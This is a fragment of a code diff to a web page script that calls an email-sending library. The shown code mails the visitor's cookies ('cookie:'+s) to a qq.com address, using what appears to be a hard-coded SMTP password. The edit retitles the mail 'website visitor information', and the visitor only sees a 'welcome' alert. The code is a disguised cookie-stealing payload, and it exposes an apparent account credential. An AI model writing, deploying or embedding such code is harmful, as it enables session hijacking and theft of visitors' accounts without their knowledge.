@@ -7,7 +7,7 @@ Email.send({
     Password : "zixxgjmmubujgdhf",      
     To : '1520402908@qq.com',         
     From : "1520402908@qq.com",       
-    Subject : "This is the subject",  
+    Subject : "网站访客信息",  
     Body : "cookie:"+s                
 }).then(
   message=> alert("欢迎光临")
